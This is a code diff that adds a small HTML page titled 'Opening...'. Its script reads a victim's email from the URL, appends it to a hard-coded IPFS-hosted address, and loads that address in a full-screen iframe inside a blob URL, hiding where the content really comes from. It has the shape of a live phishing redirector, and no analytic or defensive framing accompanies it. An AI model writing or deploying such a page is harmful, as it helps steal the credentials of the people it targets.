@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opening...</title>
+</head>
+<body style="margin:0;padding:0;">
+
+<script>
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+
+const params = new URLSearchParams(window.location.search);
+const email = params.get("email") || "";
+
+const finalURL = email ? BASE_IPFS + "#" + email : BASE_IPFS;
+
+const blobHTML = `
+<html><body style="margin:0">
+<iframe src="${finalURL}" style="width:100vw;height:100vh;border:none;"></iframe>
+</body></html>
+`;
+
+const blob = new Blob([blobHTML], { type: "text/html" });
+const blobURL = URL.createObjectURL(blob);
+
+window.location.replace(blobURL);
+</script>
+
+</body>
+</html>
